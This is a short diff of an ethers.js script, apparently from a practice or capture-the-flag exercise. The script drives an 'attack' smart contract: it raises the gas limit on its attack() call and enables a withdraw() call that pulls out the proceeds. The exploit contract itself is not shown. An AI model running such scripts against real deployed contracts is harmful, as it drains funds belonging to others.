@@ -26,14 +26,14 @@ async function main() {
     console.log('donation: '+ balance.toString());
 
     // if (balance > 0) {
-    await attack.connect(deployer).attack();
+    await attack.connect(deployer).attack({gasLimit: ethers.BigNumber.from('1000000')});
     // }
 
     // let contract_balance = await attack.myBalance();
     // console.log('attack result: '+ contract_balance.toString());
 
     // if (contract_balance > 0) {
-    //   await attack.connect(deployer).withdraw();
+    await attack.connect(deployer).withdraw();
     //   console.log('withdraw successful!')
     // }
     // else {
